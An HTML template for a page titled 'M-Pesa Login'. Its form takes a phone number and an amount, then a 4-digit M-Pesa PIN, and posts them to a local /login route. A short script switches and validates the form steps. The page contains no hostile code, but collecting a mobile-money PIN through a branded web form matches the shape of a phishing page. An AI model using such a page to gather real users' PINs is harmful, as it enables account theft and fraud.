<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>M-Pesa Login</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #f5f5f5, #eaf7ec);
      color: #1a1a1a;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }

    .container {
      width: 100%;
      max-width: 420px;
      background: #ffffff;
      border-radius: 14px;
      padding: 30px 24px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
    }

    h2 {
      text-align: center;
      margin-bottom: 8px;
      color: #0b7a3d;
    }

    .subtitle {
      text-align: center;
      color: #555;
      margin-bottom: 22px;
      font-size: 14px;
    }

    .field {
      margin-bottom: 16px;
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: #222;
    }

    input {
      width: 100%;
      padding: 12px 14px;
      border: 1px solid #d3d9d5;
      border-radius: 10px;
      font-size: 15px;
      outline: none;
    }

    input:focus {
      border-color: #0b7a3d;
      box-shadow: 0 0 0 3px rgba(11, 122, 61, 0.12);
    }

    button {
      width: 100%;
      border: none;
      background: #0b7a3d;
      color: #fff;
      font-weight: 700;
      font-size: 16px;
      border-radius: 10px;
      padding: 13px 16px;
      cursor: pointer;
      transition: 0.2s ease;
    }

    button:hover {
      background: #085d32;
    }

    button:disabled {
      background: #ccc;
      cursor: not-allowed;
    }

    .error {
      min-height: 22px;
      margin-top: 12px;
      color: #b42318;
      font-size: 14px;
      text-align: center;
    }

    .success {
      min-height: 22px;
      margin-top: 12px;
      padding: 10px;
      background-color: #e8f5e9;
      color: #0b7a3d;
      font-size: 14px;
      text-align: center;
      border-radius: 8px;
      border: 1px solid #0b7a3d;
    }

    .pin-message {
      min-height: 22px;
      margin-top: 12px;
      padding: 10px;
      background-color: #fff3cd;
      color: #856404;
      font-size: 14px;
      text-align: center;
      border-radius: 8px;
      border: 1px solid #ffc107;
      font-weight: 600;
    }

    .hidden {
      display: none;
    }

    .summary {
      background-color: #f0f8f5;
      padding: 12px;
      border-radius: 8px;
      margin-bottom: 16px;
      border-left: 4px solid #0b7a3d;
    }

    .summary-item {
      margin: 4px 0;
      font-size: 13px;
      color: #333;
    }

    .summary-label {
      font-weight: 600;
      color: #0b7a3d;
    }

    .btn-back {
      background: #6c757d;
      margin-top: 8px;
    }

    .btn-back:hover {
      background: #5a6268;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>M-Pesa Login</h2>
    <p class="subtitle">Enter your details to complete the transaction.</p>

    <form method="POST" action="/login" novalidate>
      <!-- Phone and Amount Section -->
      <div id="phoneAmountSection">
        <div class="field">
          <label for="phone">Phone Number</label>
          <input id="phone" name="phone" type="tel" placeholder="254712345678" value="{{ phone or '' }}" required />
        </div>

        <div class="field">
          <label for="amount">Amount (Ksh)</label>
          <input id="amount" name="amount" type="number" placeholder="Enter amount" value="{{ amount or '' }}" step="0.01" min="0.01" required />
        </div>

        <button type="submit" name="action" value="validate">Continue</button>
      </div>

      <!-- PIN Section -->
      <div id="pinSection" class="hidden">
        <div class="summary">
          <div class="summary-item">
            <span class="summary-label">Phone:</span> {{ phone or '' }}
          </div>
          <div class="summary-item">
            <span class="summary-label">Amount:</span> Ksh {{ amount or '' }}
          </div>
        </div>

        <div class="pin-message">
          💬 Please enter your M-Pesa PIN to confirm this transaction
        </div>

        <div class="field">
          <label for="pin">M-Pesa PIN</label>
          <input id="pin" name="pin" type="password" placeholder="Enter your 4-digit PIN" value="{{ pin or '' }}" maxlength="4" pattern="[0-9]{4}" required />
        </div>

        <button type="submit" name="action" value="confirm">Confirm PIN</button>
        <button type="submit" name="action" value="back" class="btn-back">Back</button>
      </div>

      <!-- Error Message -->
      {% if error %}
      <p class="error">❌ {{ error }}</p>
      {% endif %}

      <!-- Success Message -->
      {% if success %}
      <p class="success">✓ {{ success }}</p>
      {% endif %}
    </form>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const phoneAmountSection = document.getElementById('phoneAmountSection');
      const pinSection = document.getElementById('pinSection');
      const phone = document.getElementById('phone');
      const amount = document.getElementById('amount');
      const pin = document.getElementById('pin');
      const form = document.querySelector('form');

      // Check if we should show PIN section
      const showPin = {{ 'true' if show_pin else 'false' }};
      if (showPin) {
        phoneAmountSection.classList.add('hidden');
        pinSection.classList.remove('hidden');
        pin.focus();
      }

      // Handle form submission
      form.addEventListener('submit', function(e) {
        const action = e.submitter.value;

        if (action === 'validate') {
          // Validate phone and amount on client side
          const phoneValue = phone.value.trim();
          const amountValue = amount.value.trim();

          if (!phoneValue || !amountValue) {
            e.preventDefault();
            alert('Please enter both phone number and amount.');
            return;
          }

          // Phone validation
          if (!/^[0-9]{10,13}$/.test(phoneValue)) {
            e.preventDefault();
            alert('Please enter a valid phone number (10-13 digits).');
            phone.focus();
            return;
          }

          // Amount validation
          if (isNaN(amountValue) || parseFloat(amountValue) <= 0) {
            e.preventDefault();
            alert('Please enter a valid amount greater than zero.');
            amount.focus();
            return;
          }

          // If validation passes, show PIN section
          e.preventDefault();
          phoneAmountSection.classList.add('hidden');
          pinSection.classList.remove('hidden');
          pin.focus();
        } 
        else if (action === 'back') {
          // Go back to phone/amount section
          e.preventDefault();
          phoneAmountSection.classList.remove('hidden');
          pinSection.classList.add('hidden');
          phone.focus();
        }
        // If action is 'confirm', let the form submit normally
      });
    });
  </script>
</body>
</html>
